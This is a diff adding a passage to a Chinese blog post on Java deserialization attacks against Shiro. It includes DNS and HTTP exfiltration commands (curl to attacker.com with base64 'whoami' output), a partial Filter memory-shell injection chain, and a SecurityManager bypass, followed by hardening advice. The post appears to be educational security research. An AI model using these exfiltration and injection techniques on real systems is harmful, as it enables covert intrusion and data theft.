+<h4 id="2-无回显利用技巧"><a href="#2-无回显利用技巧" class="headerlink" title="2. 无回显利用技巧"></a>2. 无回显利用技巧</h4><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过DNS泄漏检测（适合内网场景）</span></span><br><span class="line"><span class="type">String</span> cmd = <span class="string">&quot;ping -n 3 &quot;</span>+ token + <span class="string">&quot;.dnslog.cn&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过HTTP外带数据</span></span><br><span class="line"><span class="type">String</span> exfilUrl = <span class="string">&quot; http://attacker.com/?token= &quot;</span>;</span><br><span class="line"><span class="type">String</span> cmd = <span class="string">&quot;curl &quot;</span>+ exfilUrl + <span class="string">&quot;$(whoami|base64)&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-内存马注入（进阶）"><a href="#3-内存马注入（进阶）" class="headerlink" title="3. 内存马注入（进阶）"></a>3. 内存马注入（进阶）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 示例：Filter内存马注入</span></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Thread.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getContextClassLoader&quot;</span>,...),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;loadClass&quot;</span>, </span><br><span class="line">           <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, </span><br><span class="line">           <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;javax.servlet.Filter&quot;</span>&#125;),</span><br><span class="line">    ... <span class="comment">// 构造filter注入逻辑</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="六、Java-安全机制深度解析"><a href="#六、Java-安全机制深度解析" class="headerlink" title="六、Java 安全机制深度解析"></a>六、Java 安全机制深度解析</h3><h4 id="1-Java-序列化协议细节"><a href="#1-Java-序列化协议细节" class="headerlink" title="1. Java 序列化协议细节"></a>1. Java 序列化协议细节</h4><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">AC</span> ED <span class="number">00</span> <span class="number">05</span>      → 序列化头</span><br><span class="line"><span class="attribute">73</span>               → 对象标识 (TC_OBJECT)</span><br><span class="line"><span class="attribute">72</span>              → 类描述符标识 (TC_CLASSDESC)</span><br><span class="line"><span class="attribute">00</span> <span class="number">32</span> <span class="number">63</span> <span class="number">6</span>f...   → 类名长度及UTF8名称</span><br></pre></td></tr></table></figure>
+
+<p><strong>危险特性：</strong></p>
+<ul>
+<li>任意类实例化</li>
+<li>自动递归反序列化</li>
+<li>自动调用readObject()方法</li>
+</ul>
+<h4 id="2-反射底层操作码"><a href="#2-反射底层操作码" class="headerlink" title="2. 反射底层操作码"></a>2. 反射底层操作码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Method.invoke()的JVM实现（简略）</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object obj, Object[] args)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!override) &#123;</span><br><span class="line">        <span class="comment">// 权限检查（可被setAccessible绕过）</span></span><br><span class="line">        checkAccess();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> invoke0(obj, args); <span class="comment">// native调用</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Hotspot调用流程</span></span><br><span class="line">invoke0 → JVM_InvokeMethod → jni_invoke_nonstatic()</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-安全管理器限制绕过"><a href="#3-安全管理器限制绕过" class="headerlink" title="3. 安全管理器限制绕过"></a>3. 安全管理器限制绕过</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 禁用SecurityManager检测</span></span><br><span class="line">System.setSecurityManager(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用反射直接修改字段</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">theUnsafe</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">theUnsafe.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) theUnsafe.get(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="七、深度加固方案"><a href="#七、深度加固方案" class="headerlink" title="七、深度加固方案"></a>七、深度加固方案</h3><h4 id="1-JVM字节码加固"><a href="#1-JVM字节码加固" class="headerlink" title="1. JVM字节码加固"></a>1. JVM字节码加固</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 自定义ObjectInputStream（阻止黑名单类）</span></span><br><span class="line"><span class="keyword">protected</span> Class <span class="title function_">resolveClass</span><span class="params">(ObjectStreamClass desc)</span> </span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="keyword">if</span> (blacklist.contains(desc.getName())) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(“禁止类”);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-修改JVM启动参数"><a href="#2-修改JVM启动参数" class="headerlink" title="2. 修改JVM启动参数"></a>2. 修改JVM启动参数</h4><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"># 禁用com.sun.org.apache.xalan.internal包</span><br><span class="line">–Djava.<span class="keyword">security</span>.<span class="keyword">policy</span>==shiro.<span class="keyword">policy</span></span><br><span class="line">–Djava.<span class="keyword">security</span>.manager</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-内核加固配置"><a href="#3-内核加固配置" class="headerlink" title="3. 内核加固配置"></a>3. 内核加固配置</h4><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">// linux seccomp策略禁止execve系统调用</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;SCMP_ACT_ERRNO&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;syscall&quot;</span><span class="punctuation">:</span> <span class="string">&quot;execve&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>真正的安全研究要深入到字节级操作和 JVM 层面；</p>
+<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/07/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#0x03-Shiro-550-%E5%88%86%E6%9E%90">Java反序列化Shiro篇01-Shiro550流程分析 | Drunkbaby’s Blog</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1iF411b7bD?spm_id_from=0.0.header_right.fav_list.click&vd_source=a4eba559e280bf2f1aec770f740d0645">https://www.bilibili.com/video/BV1iF411b7bD?spm_id_from=0.0.header_right.fav_list.click&amp;vd_source=a4eba559e280bf2f1aec770f740d0645</a></p>
+
                 
             </div>
             <hr/>
@@ -982,7 +1140,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">39.8k</span>&nbsp;字
+                class="white-color">43.3k</span>&nbsp;字
             
             
             
